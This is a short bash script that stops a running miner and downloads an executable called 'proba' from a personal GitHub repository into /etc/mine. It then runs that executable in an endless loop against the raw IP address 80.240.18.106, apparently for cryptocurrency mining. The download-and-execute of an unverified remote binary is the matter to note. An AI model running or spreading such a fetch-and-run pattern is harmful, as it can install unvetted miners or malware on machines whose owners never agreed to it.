#!/bin/bash
miner stop
sleep 20
cd /etc
cd mine
wget -c https://github.com/aleksey1255/ai/raw/main/proba
chmod u+x proba
while true; do 
timeout 1800 ./proba -a 80.240.18.106
done
